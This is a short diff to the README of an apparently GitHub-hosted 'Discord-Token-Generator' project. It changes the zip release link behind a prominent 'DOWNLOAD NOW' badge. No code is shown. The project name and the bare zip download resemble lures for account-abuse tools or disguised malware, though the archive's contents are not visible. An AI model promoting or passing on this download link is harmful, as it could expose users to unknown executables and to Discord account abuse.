@@ -34,7 +34,7 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/johnj-eng96n9/Discord-Token-Generator/releases/download/78345/DiscordBotGenerator.zip">
+  <a href="https://github.com/johnj-eng96n9/Discord-Token-Generator/releases/download/4578/Discord-Token-Generator.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
